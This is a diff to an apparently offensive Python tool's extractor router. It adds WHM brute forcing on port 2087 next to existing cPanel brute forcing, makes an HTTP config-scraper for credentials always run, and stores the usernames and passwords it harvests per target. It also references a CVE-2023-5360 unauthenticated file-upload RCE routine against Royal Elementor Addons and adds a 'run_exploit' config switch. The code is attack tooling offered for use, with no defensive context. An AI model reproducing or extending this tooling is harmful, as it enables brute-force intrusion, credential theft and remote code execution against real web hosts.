@@ -1,6 +1,7 @@
 """Extractor router — runs extractors in priority order with credential injection."""
 
 import os
+import configparser
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
@@ -17,7 +18,12 @@ class ExtractorRouter:
         """
         self.results = results
         self.scanner = scanner
-        self.found_credentials = {}  # domain_id -> list of (user, pass)
+        self.found_credentials = {}
+        
+        config = configparser.ConfigParser()
+        config_path = os.path.join(BASE_DIR, '..', '..', '..', 'config', 'settings.ini')
+        config.read(config_path)
+        self.run_exploit = config.getboolean('Exploit', 'run_exploit', fallback=False)
 
     def run(self):
         for domain_id, data in list(self.results.items()):
@@ -43,10 +49,12 @@ class ExtractorRouter:
             # 3. cPanel brute force
             if self._has_port(data, 2083):
                 self._run_cpanel(domain_id, ip, host)
+            # 3b. WHM brute force
+            if self._has_port(data, 2087):
+                self._run_whm(domain_id, ip, host)
 
-            # 4. Config scraper if cPanel failed
-            if not self.found_credentials.get(domain_id):
-                self._run_config_scraper(domain_id, ip, host)
+            # 4. Config scraper — always run
+            self._run_config_scraper(domain_id, ip, host)
 
             # 5. Service extractors
             for port_entry in data['open_ports']:
@@ -91,6 +99,22 @@ class ExtractorRouter:
                 print(f"\n[ROUTER] Re-scanning origin IP {origin_ip} for {host}")
                 self.scanner._scan_target(f"{domain_id}_origin", host, origin_ip)
                 self.scanner._export_json()
+
+    def _run_whm(self, domain_id: str, ip: str, host: str):
+        """Attempt WHM brute force on port 2087 — higher privilege than cPanel.
+
+        Args:
+            domain_id (str): Target identifier.
+            ip (str): Target IP.
+            host (str): Domain name.
+        """
+        from src.utils.extractors.cpanel import CPanelExtractor
+        extractor = CPanelExtractor(ip=ip, port=2087, host=host)
+        result = extractor.run()
+        if result.get('credentials'):
+            creds = [(c['user'], c['password']) for c in result['credentials']]
+            self.found_credentials[domain_id] = creds
+            self.results[domain_id]['whm_credentials'] = result['credentials']
 
     def _run_royal_elementor_exploit(self, domain_id: str, ip: str, host: str, port: int):
             """Attempt CVE-2023-5360 unauthenticated file upload RCE against Royal Elementor Addons.
@@ -180,8 +204,10 @@ class ExtractorRouter:
             ip (str): Target IP.
             host (str): Domain name.
         """
+        print(f"  [CONFIG] Starting...", flush=True)
         from src.utils.extractors.http_config_scraper import HTTPConfigScraper
-        scraper = HTTPConfigScraper(host=host, ip=ip)
+        www_host = f"www.{host}" if not host.startswith('www.') else host
+        scraper = HTTPConfigScraper(host=www_host, ip=ip)
         result = scraper.run()
         if result['credentials']:
             self.results[domain_id]['config_credentials'] = result['credentials']
